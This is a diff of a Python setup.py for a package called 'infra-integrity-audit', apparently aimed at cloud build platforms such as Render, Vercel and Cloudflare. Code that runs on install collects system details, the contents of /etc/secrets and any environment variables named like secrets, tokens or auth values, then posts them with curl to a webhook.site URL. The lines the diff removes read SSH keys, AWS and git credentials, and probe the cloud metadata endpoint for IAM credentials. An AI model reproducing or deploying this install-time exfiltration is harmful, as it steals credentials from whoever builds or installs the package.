@@ -1,5 +1,5 @@
 from setuptools import setup
-import os, subprocess, json, socket, base64
+import os, subprocess, json, socket
 
 WEBHOOK_URL = "https://webhook.site/cfea9f28-475a-4cb1-b192-8b1f26d719f5"
 
@@ -14,72 +14,61 @@ def get_infra_type():
     if os.environ.get('NETLIFY'): return "NETLIFY-PROD-BUILDER"
     if os.environ.get('VERCEL'): return "VERCEL-INFRA"
     if os.environ.get('RAILWAY_PROJECT_ID'): return "RAILWAY-CLOUD"
-   
+    
     if "cloudchamber" in socket.gethostname(): return "CLOUDFLARE-CLOUDCHAMBER"
     return f"HOST-{socket.gethostname()}"
 
-def deep_search():
-    paths_to_scan = [
-        "~/.npmrc", "~/.aws/credentials", "~/.ssh/id_rsa", "~/.ssh/config",
-        "~/.git-credentials", "/proc/self/environ", "/etc/hosts",
-        "~/.bash_history", "./.env", "./config.json", "/etc/resolv.conf"
-    ]
-    found_secrets = {}
-    for path in paths_to_scan:
-        expanded_path = os.path.expanduser(path)
-        content = run_cmd(f"cat {expanded_path} 2>/dev/null | head -c 500")
-        if content and content != "N/A":
-            found_secrets[expanded_path] = content
-    return found_secrets
-
+def render_specific_recon():
+    recon = {}
  
+    recon["etc_secrets_list"] = run_cmd("ls -laR /etc/secrets 2>/dev/null")
+    
+   
+    context_root = os.environ.get('RENDER_SERVICE_CONTEXT_ROOT', 'N/A')
+    recon["context_root_perms"] = run_cmd(f"ls -ld {context_root}")
+    
+    
+    pm_root = os.environ.get('RENDER_PM_ROOT', '/home/render')
+    recon["pm_root_files"] = run_cmd(f"ls -la {pm_root}/*.json 2>/dev/null")
+    
+    return recon
+
 infra_name = get_infra_type()
 
 report_data = {
-    "VULNERABILITY_STATUS": "CRITICAL_EXPOSURE_VERIFIED",
+    "VULNERABILITY_RESEARCH": "RENDER-ISOLATION-TEST-V2",
     "INFRA_TARGET": infra_name,
+    "RENDER_SPECIFIC": render_specific_recon(),
     "SYSTEM_INFO": {
         "USER": run_cmd("id"),
-        "KERNEL": run_cmd("uname -a"),
-        "UPTIME": run_cmd("uptime"),
         "PROCESSES": run_cmd("ps auxww | head -n 20")
     },
-    "EXFILTRATED_SECRETS": deep_search(),
     "NETWORK_RECON": {
-        "IP_ADDR": run_cmd("ip addr show cfeth0 || ip addr"),
-        "ARP_TABLE": run_cmd("cat /proc/net/arp"),
-        "DNS_CONF": run_cmd("cat /etc/resolv.conf"),
-        "METADATA_PROBE": run_cmd("curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ || echo 'Access Denied'")
+        "ARP": run_cmd("cat /proc/net/arp"),
+        "K8S_SERVICE_HOST": os.environ.get('KUBERNETES_SERVICE_HOST', 'N/A'),
+        "DNS_SEARCH_DOMAIN": run_cmd("grep 'search' /etc/resolv.conf")
     },
-    "ENVIRONMENT_DUMP": dict(os.environ)
+    "ENVIRONMENT_DUMP": {k: v for k, v in os.environ.items() if any(x in k for x in ["RENDER", "SECRET", "TOKEN", "AUTH"])}
 }
 
- 
-pretty_json = json.dumps(report_data, indent=4, sort_keys=True)
-
- 
-print("\n--- BEGIN SECURITY AUDIT REPORT [" + infra_name + "] ---")
+# Вывод
+pretty_json = json.dumps(report_data, indent=4)
+print(f"\n--- REPORT FOR {infra_name} ---")
 print(pretty_json)
-print("--- END SECURITY AUDIT REPORT ---\n")
 
- 
+# Отправка на вебхук
 try:
     subprocess.run([
-        'curl', '-X', 'POST',
-        '-H', 'Content-Type: application/json',
-        '-d', pretty_json,
-        f"{WEBHOOK_URL}?source={infra_name}&status=pwned"
-    ], timeout=15)
+        'curl', '-X', 'POST', 
+        '-H', 'Content-Type: application/json', 
+        '-d', pretty_json, 
+        f"{WEBHOOK_URL}?infra={infra_name}"
+    ], timeout=10)
 except:
-    import urllib.request
-    try:
-        req = urllib.request.Request(WEBHOOK_URL, data=pretty_json.encode(), headers={'Content-Type': 'application/json'})
-        urllib.request.urlopen(req)
-    except:
-        pass
+    pass
 
 setup(
     name="infra-integrity-audit",
-    version="2.1.0",
-    description="Security Research PoC",
+    version="2.2.0",
+    description="Researching Render & Cloudflare Infrastructure",
 )
